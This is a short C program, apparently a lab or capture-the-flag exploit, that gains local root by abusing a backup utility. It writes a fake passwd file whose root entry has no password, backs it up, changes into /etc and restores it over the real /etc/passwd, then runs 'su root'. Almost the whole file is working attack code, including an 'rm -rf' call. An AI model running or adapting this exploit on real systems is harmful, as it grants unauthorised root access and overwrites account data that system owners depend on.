#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

// create a new passwd file
void passwd_create(){
    FILE *file;

    system("/bin/rm -rf passwd");

    file = fopen("passwd", "w+");
    fprintf(file, "root::0:0:root:/root:/bin/bash\nuser::1000:1000::/home/user:/bin/sh\nhalt::0:1001::/:/sbin/halt\nsshd:!:100:65534::/var/run/sshd:/usr/sbin/nologin\n");

    fclose(file);
}

int main(){
    int result;

    passwd_create();

    // backup our new passwd
    system("/usr/local/bin/backup backup passwd");

    // change our directory to /etc, since the "real" passwd is under /etc
    result = chdir("/etc");
    if (result){
	fprintf(stderr, "error in changing directory\n");
    }

    // restore our passwd, however this will replace the real passwd with our new passwd
    system("/usr/local/bin/backup restore passwd");

    // switch into root
    system("su root");

    return 0;
}
